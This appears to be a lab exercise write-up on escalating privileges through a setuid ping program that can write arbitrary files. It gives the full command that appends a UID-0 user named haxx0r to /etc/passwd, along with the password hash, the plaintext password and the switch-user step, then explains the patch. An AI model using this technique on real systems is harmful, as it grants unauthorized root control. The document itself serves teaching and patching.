Privilege Escalation (Aufgabe 1)

To get root access on the machine, you can run the ping command like this:

    /*placeholder ip   dont ping  write to passwd   new user info */
    ping 1.1.1.1        -c 0     -f /etc/passwd    -m "haxx0r:\$1\$salted\$A/TVACzJa/yhmRmaUWfgJ1:0:0:root:/root:/bin/bash"

This will add to passwd a user with the following credentials:

    username: haxx0r
    password: p455w0rd

Explaining the parameters:

    1.1.1.1: Just a placeholder value so that the application executes, as we are not doing any actual ping
    -c 0: don't run the ping while
    -f /etc/passwd: write to passwd file. This is the major flaw of this program, it has suid, so it can access and write to
    any file of the system, and from that we can exploit multiple files to get root access
    -m "haxx0r:\$1\$salted\$A/TVACzJa/yhmRmaUWfgJ1:0:0:root:/root:/bin/bash": this is a passwd line that creates the
    user haxx0r, the password is already generated using openssl and injected directly onto the passwd file.

        openssl passwd -1 -salt salted p455w0rd

    And the user is on the root group with root privileges.

After running the command, you can just switch to the user with the given credentials.

    su haxx0r

To patch this vulnerability, you just have to set the effective user id of the program as the id of the user running it before
opening the file. This will make the file open work under the user's permissions. The patch is provided in the file ping.patch.

